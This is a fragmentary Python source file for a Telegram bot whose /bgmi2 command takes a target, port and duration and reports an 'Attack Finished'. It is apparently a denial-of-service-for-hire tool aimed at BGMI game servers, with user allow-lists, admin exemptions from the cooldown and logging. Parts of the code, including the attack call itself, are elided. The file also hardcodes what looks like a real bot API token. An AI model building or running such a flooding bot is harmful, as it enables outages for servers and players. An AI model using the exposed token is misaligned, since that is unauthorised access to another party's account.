...
bot = telebot.TeleBot('7837978161:AAEU_5PbmdVapbPQ8s_VSiZCYG_ly2Y4Qes')
...
def handle_bgmi2(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi2_cooldown and (datetime.datetime.now() - bgmi2_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi2 Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi2_cooldown[user_id] = datetime.datetime.now()
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                response = f"bgmi2 Attack Finished. Target: {target} Port: {port} Time: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- /bgmi2 <target> <port> <time>"  # Updated command syntax
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi2 @RitikXyz099")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi2 and website commands
...
💥 /bgmi2 : Method For bgmi2 Servers. 
